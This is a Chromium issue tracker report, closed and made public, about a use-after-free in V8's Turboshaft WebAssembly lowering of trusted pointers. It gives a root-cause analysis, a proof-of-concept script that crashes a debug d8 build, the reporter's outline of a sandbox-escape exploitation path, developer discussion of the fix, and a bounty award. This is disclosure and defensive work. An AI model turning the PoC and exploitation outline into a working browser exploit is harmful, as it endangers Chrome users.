# UAF Vulnerability in TrustedSpace Due To Turboshaft's Optimization of TrustedPointers in WebAssembly

| Field | Value |
|-------|-------|
| **Issue ID** | [471363817](https://issues.chromium.org/issues/471363817) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ml...@chromium.org |
| **Created** | 2025-12-24 |
| **Bounty** | $10,000.00 |

## Description

## Details

The root cause of the vulnerability lies in an optimization in WebAssembly by Turboshaft's `LoadStoreSimplificationReducer`. Commit `a2de10e947d76825a26b363235cf4b5c159305ed` introduced a new optimization: `V<Object> REDUCE(LoadTrustedPointer)` will transform `LoadTrustedPointer` operations into lower-level nodes, but this optimization process introduced an unintended side effect.

After instruction selection, the `opt_me` method generates the following Graph. Due to loop peeling, `B10` is the peeled iteration of the loop, and `B15` is the loop body:

```
Block B10 <- B8
phi:
27: v23 = X64Mov1 : MRI v24, #3     ;; internal field of WasmFuncRef
28: v19 = X64Movq : Root #600     ;; convert TrustedPointer to TaggedPointer
29: v22 = X64Shr32 v23, #9
30: v21 = X64Lea32 : M8 v22
31: v18 = 9207327963182268415
32: v7 = X64And : MRI v18, v19, v21 ;; get TaggedPointer represented as kWord64
33: v17 = SAME_AS_INPUT: 0 v7       ;; convert kWord64 to kTaggedPointer
34: v13 = X64MovqDecompressProtected : MRI v17, #7
35: v12 = X64Movl : MRI v17, #19
36: ArchCalWasmFunctionIndirect v12, v13, v14, #1
37: ArchJmp imm:11

...

Block B15  <- B14   ;; Loop Body
phi:
43: v6 = SAME_AS_INPUT: 0 v7    ;; directly reuse the result from B10
44: v3 = X64MovqDecompressProtected : MRI v6, #7
45: v2 = X64Movl : MRI v6, #19
46: ArchCalWasmFunctionIndirect v2, v3, v1, #1
47: v0 = X64Lea32 : MRI v1, #1
48: ArchJmp imm:11

```

Note: **The value in `v7` is actually a pointer, but its `MachineRepresentation` is `kWord`**.

During register allocation:

- `v7` in `B10` is spilled to `stack:5` because it is followed by a call instruction.
- When entering `B15`, `v7` is needed again, so `stack:5` is reloaded into a register.

Now let's consider the safe pointer table:

Since `ArchCalWasmFunctionIndirect` is a call instruction, a `ReferenceMap` is added to this instruction. The `ReferenceMap` needs to record all alive slots in the JIT-optimized function's stack that hold Heap pointers at that moment.

The `call` instruction may trigger GC, which can move pointers to the V8 Heap. Therefore, when processing an optimized frame, it must know which slots contain pointers to the V8 Heap so they can be correctly updated. The `Safepoint Table` is used to record which slots in a given stack frame contain pointers. The `Safepoint Table` is a highly serialized and compressed data structure, while `ReferenceMap` is a data structure used during register allocation to assist in generating the `Safepoint Table`.

`PopulateReferenceMapsPhase` in `Pipeline::AllocateRegisters` is responsible for generating the `ReferenceMap`. `PopulateReferenceMaps()` will skill `vreg`s that don't contain references.

```
void ReferenceMapPopulator::PopulateReferenceMaps() {
  ...

  // Iterate over all safe point positions and record a pointer
  // for all spilled live ranges at this point.

  int last_range_start = 0;
  const ReferenceMaps* reference_maps = data()->code()->reference_maps();
  ReferenceMaps::const_iterator first_it = reference_maps->begin();

  const size_t live_ranges_size = data()->live_ranges().size();
  ZoneVector<TopLevelLiveRange*> candidate_ranges(data()->allocation_zone());
  candidate_ranges.reserve(data()->live_ranges().size());
  for (TopLevelLiveRange* range : data()->live_ranges()) {
    // Skip non-reference values.
    if (!data()->code()->IsReference(range->vreg())) continue;  // <====
    // Skip empty live ranges.
    if (range->IsEmpty()) continue;
    if (range->has_preassigned_slot()) continue;
    candidate_ranges.push_back(range);
  }
  ...
}

```

Do you remember `v7`? This variable's `MachineRepresentation = kWord64`, so `IsReference(range->vreg())` returns false. Therefore, `PopulateReferenceMaps` does not consider `v7` to be a pointer and does not add it to the `ReferenceMap`.

As a result, during instruction generation: `CodeGenerator::RecordSafepoint()` is responsible for recording the safepoint. Since `v7` is not in the `ReferenceMap` of the call instruction, the corresponding `stack:5` for `v7` is not added to the `Safepoint`.

Ultimately, when the `ArchCalWasmFunctionIndirect` instruction triggers GC, the pointer in `stack:5` is not updated. The actual `WasmInternalFunction` is moved to another space, causing `stack:5` to point to memory that has already been freed. When `B15` attempts to continue using `stack:5`, a segmentation fault is triggered.

## REPRODUCTION CASE

poc.js:

```
d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");


gc({type: "major"});
gc({type: "major"});

const builder = new WasmModuleBuilder();

let $trigger_gc = builder.addImport("js", "func", kSig_v_i);
let $trigger_gc_signature = builder.addType(kSig_v_i);
builder.addDeclarativeElementSegment([$trigger_gc]);

let f = builder.addFunction("opt_me", kSig_v_i) // local0: function parameter, represents the loop count cnt
.addLocals(kWasmI32, 1) // local1: loop counter i
.addLocals(wasmRefType(kSig_v_i), 1) // local2: used to save the reference to function $trigger_gc
.addBody([
    // Generate function reference
    // ref.func will allocate `WasmInternalFunction` objects in TrustedSpace, allocating multiple objects that lack references
    kExprRefFunc, $trigger_gc,
    kExprLocalSet, 2,
    kExprRefFunc, $trigger_gc,
    kExprLocalSet, 2,
    kExprRefFunc, $trigger_gc,
    kExprLocalSet, 2,

    // This one keeps a reference. When GC occurs, the previous `WasmInternalFunction` objects will be collected,
    // so this object will be migrated to a lower address region.
    kExprRefFunc, $trigger_gc,
    kExprLocalSet, 2,

    kExprLoop, kWasmVoid,   // while(True)
        kExprLocalGet, 1,   // if( i < cnt )
        kExprLocalGet, 0,
        kExprI32LtS,
        kExprIf, kWasmVoid,

            kExprLocalGet, 1,   // $trigger_gc(i)
            kExprLocalGet, 2,
            kExprCallRef, $trigger_gc_signature,

            kExprLocalGet, 1,   // i++
            kExprI32Const, 1,
            kExprI32Add,
            kExprLocalSet, 1,

            kExprBr, 1,
        kExprEnd,
    kExprEnd,

]).exportFunc();



function trigger_gc(i) { 
    if(i==50) {
        gc({type: "major"});
    }
}

let imports = {
    js: {
        func: trigger_gc
    }
}
const wasmInstance = builder.instantiate(imports);
let opt_me = wasmInstance.exports.opt_me;
%WasmTierUpFunction(opt_me);
opt_me(100);

%DebugPrint(opt_me);

%SystemBreak();

```

V8 must be built with a debug configuration. Execute v8 as follows:

```
./d8 \
    --expose-gc \
    --allow-natives-syntax \
    --stress-incremental-marking \
    ./poc.js

```

This will result in the following crash:

```
Received signal 11 SEGV_ACCERR 143c010435e8

==== C stack trace ===============================

```

CREDIT INFORMATION

Reporter credit: [303f06e3]

## Timeline

### hu...@gmail.com (2025-12-24)

I believe this vulnerability is likely exploitable and could directly bypass the V8 sandbox, as it is an UAF in the trusted space.

Below is my approach:

1. Heap spray in the trusted space to forge a WasmInternalFunction object.
2. The code generated by turboshaft will read WasmInternalFunction object and check whether the signature matches. If the match is successful, it will load function idx field to look up the entry pointer table and obtain the function entry point.
3. No bounds checking is performed when looking up the entry pointer table. Therefore, we can carefully craft a function idx to trigger an out-of-bounds read, accessing a controllable address and directly hijacking the PC.

I am currently attempting this. If successful, I will send my exploit.

### ch...@google.com (2025-12-25)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### cl...@appspot.gserviceaccount.com (2025-12-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6409591273226240.

### 24...@project.gserviceaccount.com (2025-12-26)

Testcase 6409591273226240 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6409591273226240.

### sk...@google.com (2025-12-26)

Assigning to current V8 shepherd and setting provisional severity/priority

### ch...@google.com (2025-12-27)

Setting milestone because of s2 severity.

### dm...@chromium.org (2026-01-02)

Argh, that's a sad one... Adding some details: the issue comes from here:

We have:

```
    // Untag the pointer and remove the marking bit in one operation.
    decoded_ptr =
        __ Word64BitwiseAnd(decoded_ptr, ~(tag | kTrustedPointerTableMarkBit));
    // Bitcast to tagged to this gets scanned by the GC properly.
    return __ BitcastWordPtrToTagged(decoded_ptr);

```

Where the initial value of `decoded_ptr` computed with an immutable load (which can be GVNed!). And we have 2 LoadTrustedPointer with the same inputs, so the load of `decoded_ptr` in the 2nd one gets GVNed (this late in the pipeline, LateLoadElimination has already ran, so GVN is the only way to remove loads). So we end up with (more or less) (using operation IDs from the graph after the WasmDeadCodeElimination phase):

```
// Lowering of the first LoadTrustedPointer:
v58: Load(..., immutable)
v61: v58 & <tag>
v62: BitcastWordPtrToTagged(v61)
...
// Lowering of the second LoadTrustedPointer:
// GVNed Load: v58
// GVNed bitwise AND: v61
v86: BitcastWordPtrToTagged(v61)

```

So... yea, that's sad. It looks to me like this might have already been an issue before though, and also I'm not sure why loop peeling is needed to repro (I don't want to spend time answering those 2 questions though).

As far as fixes go...

- We could disable GVN during the lowering of LoadTrustedPointer (DisableValueNumbering already exists, although its uses so far have always been for performance reasons rather than correctness ones). This is a bit brittle because if we ever do the lowering of LoadTrustedPointerField earlier in the graph, then this will break (because GVN is only disabled when emitting the operation, and not for the whole lifetime of an operation in the pipeline).
- Maybe cleaner would be to introduce a new UntagTrustedPointer operation that wouldn't be lowered until instruction selection. However, I think that this has the same issue: the Load before could be GVNed and so with a well-placed GC we'd end up with a stale pointer again. And we currently don't have a way to tell the GC that the load is actually "almost" a pointer (not fully a pointer because it's missing the untagging..). To overcome this, I'd suggest:
  
  - Either not marking the Load as Immutable (since after all, this late in the pipeline, the Immutable annotation doesn't do much except enable GVN (which is apparently wrong).
  - Or, we could have a special load kind (or a distinct load operation altogether) that gets lowered to Load+BitwiseAnd in the instruction selector (or even in the code generator since anyways we don't plan on doing many optimizations on that).

Since Matthias is OOO until next week and the branch cut is coming quickly, I'll upload a patch with the DisableValueNumbering fix, and Matthias can decide when he is back what he wants to do.

### le...@chromium.org (2026-01-02)

"Merry Christmas, here's a UAF for you" :)

Yeah I think a special load kind (or variant flag in the standard Load) would be the way to go, it's nice to be able to reason about trusted pointer loads as effectively atomic as far as the GC is concerned. The intermediate type-erased BitwiseAnd result is kind of incidental, and we would like to be able to GVN v62 and v86 in the example above.

### dx...@google.com (2026-01-02)

Project: v8/v8  

Branch:  main  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7378853>

[turboshaft] Prevent GVN during lowering of LoadTrustedPointer

---


Expand for full commit details
```
     
    Bug: 471363817 
    Change-Id: I5d26c5c0566f7db255f88e56e8a7a5ff320fe249 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7378853 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#104473}

```

---

Files:

- M `src/compiler/turboshaft/load-store-simplification-reducer.h`
- A `test/mjsunit/wasm/regress-471363817.js`

---

Hash: [db9154ff00a7b375ae1eff6c49e782ef6248195c](https://chromiumdash.appspot.com/commit/db9154ff00a7b375ae1eff6c49e782ef6248195c)  

Date: Fri Jan 2 08:51:09 2026


---

### ml...@chromium.org (2026-01-09)

Thanks a lot for reporting this issue and thanks Darius for providing a quick fix while I was still OOO.

As the fix addresses this issue, I will mark this report as fixed. Proper handling of trusted loads in Turboshaft will be a follow-up issue as it's more of a feature to prevent further issues in this space and will be tracked in [issue 474402851](https://issues.chromium.org/issues/474402851).

### ch...@google.com (2026-01-09)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M144. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: M144 has already been cut for stable release.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ml...@chromium.org (2026-01-09)

The [change introducing the bug](https://chromiumdash.appspot.com/commit/d5083e1109db3cd6c7775f79dbb218581917993b) is not part of M144 and therefore this issue does not require a backmerge.

### sp...@google.com (2026-01-16)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
high quality memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### dr...@google.com (2026-01-21)

Per [#comment13](https://issues.chromium.org/issues/471363817#comment13), updating FoundIn to M145

### ch...@google.com (2026-04-18)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/471363817)*
